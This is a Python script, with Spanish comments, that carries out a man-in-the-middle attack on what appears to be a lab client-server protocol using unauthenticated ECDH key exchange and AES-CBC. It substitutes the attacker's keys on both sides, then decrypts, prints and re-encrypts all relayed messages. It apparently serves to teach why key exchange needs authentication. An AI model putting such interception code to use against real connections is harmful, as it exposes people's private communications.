import socket
import threading
from cryptography.hazmat.primitives import serialization, hashes, padding
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

# Funciones de cifrado y descifrado AES-192 CBC
def derivar_clave(shared_key: bytes) -> bytes:
    hkdf = HKDF(
        algorithm=hashes.SHA256(),
        length=24,
        salt=None,
        info=b'handshake data',
    )
    return hkdf.derive(shared_key)

def cifrar_mensaje(mensaje: str, clave: bytes) -> bytes:
    iv = os.urandom(16)
    padder = padding.PKCS7(128).padder()
    datos_padded = padder.update(mensaje.encode()) + padder.finalize()
    cipher = Cipher(algorithms.AES(clave), modes.CBC(iv))
    encryptor = cipher.encryptor()
    cifrado = encryptor.update(datos_padded) + encryptor.finalize()
    return iv + cifrado

def descifrar_mensaje(datos: bytes, clave: bytes) -> str:
    iv = datos[:16]
    cifrado = datos[16:]
    cipher = Cipher(algorithms.AES(clave), modes.CBC(iv))
    decryptor = cipher.decryptor()
    datos_padded = decryptor.update(cifrado) + decryptor.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    mensaje = unpadder.update(datos_padded) + unpadder.finalize()
    return mensaje.decode()

# Dirección IP real de la máquina atacante
HOST = '10.20.17.64'
PORT_CLIENTE = 65432  # Escucha como si fuera servidor
PORT_SERVIDOR = 65433  # Conexión al servidor real

# Generar claves del atacante para ambos lados
private_key_cliente = ec.generate_private_key(ec.SECP256R1())
public_key_cliente = private_key_cliente.public_key()
public_bytes_cliente = public_key_cliente.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

private_key_servidor = ec.generate_private_key(ec.SECP256R1())
public_key_servidor = private_key_servidor.public_key()
public_bytes_servidor = public_key_servidor.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

# Paso 1: Conectarse con el servidor real
print("[MITM] Conectando al servidor real...")
s_servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_servidor.connect((HOST, PORT_SERVIDOR))

# Recibir clave pública del servidor real
server_public_bytes = s_servidor.recv(1024)
server_public_key = serialization.load_pem_public_key(server_public_bytes)

# Enviar clave pública falsa del atacante (como cliente)
s_servidor.sendall(public_bytes_servidor)

# Derivar clave con el servidor
shared_key_servidor = private_key_servidor.exchange(ec.ECDH(), server_public_key)
clave_servidor = derivar_clave(shared_key_servidor)
print("[MITM] Clave con servidor:", clave_servidor.hex())

# Paso 2: Esperar conexión del cliente real
s_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s_cliente.bind((HOST, PORT_CLIENTE))
s_cliente.listen(1)
print("[MITM] Esperando conexión del cliente real...")

conn_cliente, addr_cliente = s_cliente.accept()
print("[MITM] Cliente real conectado:", addr_cliente)

# Enviar clave pública falsa (como si fuera el servidor)
conn_cliente.sendall(public_bytes_cliente)

# Recibir clave pública real del cliente
cliente_public_bytes = conn_cliente.recv(1024)
cliente_public_key = serialization.load_pem_public_key(cliente_public_bytes)

# Derivar clave con el cliente
shared_key_cliente = private_key_cliente.exchange(ec.ECDH(), cliente_public_key)
clave_cliente = derivar_clave(shared_key_cliente)
print("[MITM] Clave con cliente:", clave_cliente.hex())

# Hilos para reenviar mensajes (descifra -> muestra -> vuelve a cifrar -> reenvía)
def cliente_a_servidor():
    while True:
        datos = conn_cliente.recv(4096)
        if not datos:
            break
        mensaje = descifrar_mensaje(datos, clave_cliente)
        print("[MITM] Cliente → Servidor:", mensaje)

        datos_reenviados = cifrar_mensaje(mensaje, clave_servidor)
        s_servidor.sendall(datos_reenviados)

def servidor_a_cliente():
    while True:
        datos = s_servidor.recv(4096)
        if not datos:
            break
        mensaje = descifrar_mensaje(datos, clave_servidor)
        print("[MITM] Servidor → Cliente:", mensaje)

        datos_reenviados = cifrar_mensaje(mensaje, clave_cliente)
        conn_cliente.sendall(datos_reenviados)

# Ejecutar los hilos
threading.Thread(target=cliente_a_servidor).start()
threading.Thread(target=servidor_a_cliente).start()

